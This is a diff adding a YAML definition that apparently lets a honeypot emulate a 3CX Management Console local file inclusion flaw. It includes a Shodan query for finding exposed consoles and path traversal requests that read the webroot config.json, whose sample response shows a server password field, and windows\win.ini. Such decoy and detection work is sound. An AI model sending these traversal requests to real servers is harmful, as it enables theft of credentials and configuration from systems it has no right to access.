@@ -1,0 +1,35 @@
+id: 3cx-management-console
+info:
+  name: 3CX Management Console - Local File Inclusion
+  author: random-robbie
+  description: 3CX Management Console is vulnerable to local file inclusion.
+  severity: high
+  reference:
+  - https://medium.com/@frycos/pwning-3cx-phone-management-backends-from-the-internet-d0096339dd88
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+    shodan-query: http.title:"3CX Phone System Management Console"
+  tags: 3cx,lfi,voip
+traps:
+- request:
+    method: GET
+    path: /Electron/download/windows/..\..\..\Http\webroot\config.json
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: CfgServerPasswordCfgServerAppNamebit app supportfontsextensions
+- request:
+    method: GET
+    path: /Electron/download/windows/\windows\win.ini
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
